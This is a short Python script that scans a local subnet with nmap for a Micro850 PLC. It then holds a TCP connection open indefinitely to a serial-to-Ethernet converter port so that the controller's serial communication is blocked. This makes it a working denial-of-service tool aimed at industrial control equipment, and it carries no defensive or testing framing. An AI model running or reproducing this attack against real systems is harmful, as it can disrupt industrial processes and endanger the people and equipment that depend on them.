import subprocess
import socket
import time
import threading

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def block_serial_com(ip_address, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the serial to Ethernet converter
        sock.connect((ip_address, port))
        
        print(f"Connected to {ip_address}:{port}. Holding the connection open...")
        
        # Hold the connection open
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Failed to block serial COM: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Assuming the serial to Ethernet converter is connected to the same subnet
        converter_ip = input("Enter the serial to Ethernet converter IP (or press enter to use the PLC's IP): ")
        if converter_ip == "":
            converter_ip = plc_ip
        
        # Define the port to block (e.g., 20001 for serial COM 1)
        port = int(input("Enter the port to block (e.g., 20001): "))
        
        block_thread = threading.Thread(target=block_serial_com, args=(converter_ip, port))
        block_thread.daemon = True  # So that the thread dies when main thread dies
        block_thread.start()
        
        while True:
            user_input = input("Type 'top' to stop blocking: ")
            if user_input.lower() == 'top':
                break
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()